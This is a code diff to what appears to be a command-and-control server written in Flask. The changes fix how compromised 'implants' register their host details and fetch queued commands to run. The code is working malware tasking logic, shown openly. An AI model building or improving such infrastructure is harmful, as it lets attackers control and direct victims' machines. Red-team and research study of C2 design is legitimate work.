@@ -42,16 +42,18 @@ def register():
 
             if error is None:
                 try:
-                    implant = Implant.query.filter_by(computer_guid=computer_guid)
+                    implant = Implant.query.filter_by(computer_guid=computer_guid).first()
+                    
+                    
                     if implant:
                         implant.computer_name = cmp_name
                         implant.computer_user = user_name
                         implant.last_seen = last_seen
 
                         db.session.commit()
+                        print("Implant updated")
                         return jsonify({"status":"good job"})
 
-                        print("Implant updated")
 
                     else:
                         implant = Implant(
@@ -94,16 +96,17 @@ def get_next_command():
             impl_id = request.json["computer_guid"]
 
             if impl_id:
-                commands = Command.query.filter_by(
-                    computer_guid=impl_id, status="not_taken_by_implant")
-                if commands:
-                    first_value = commands.first()
-                    command = first_value.command_text
+                next_command = Command.query.filter_by(
+                    computer_guid=impl_id, status="not_taken_by_implant").first()
+                print(next_command)
+                if next_command:
+                    
+                    command = next_command.command_text
                     now = datetime.now()
                     current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
-                    cmd_id = first_value.command_id
-                    first_value.time_issued = current_date_time
-                    first_value.status = "taken_by_implant"
+                    cmd_id = next_command.command_id
+                    next_command.time_issued = current_date_time
+                    next_command.status = "taken_by_implant"
                     db.session.commit()
                     return jsonify({"command_id": cmd_id, "command": command})
                 else:
